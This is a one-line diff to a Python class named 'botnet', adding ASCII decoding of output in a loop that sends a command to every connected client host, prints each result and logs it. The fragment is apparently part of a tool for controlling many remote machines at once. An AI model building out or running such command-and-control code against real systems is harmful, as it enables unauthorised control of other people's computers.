@@ -20,6 +20,7 @@ class botnet:
             "%H:%M:%S") + ' ) ' + '\n\n')
         for client in self.botnet:
             outp = client.send_command(cmd)
+            outp = outp.decode('ascii')
             print(f'[*] Output from {client.host}')
             print(f'[+] {outp}')
             self.f.write(f'[*] Output from {client.host}\n')
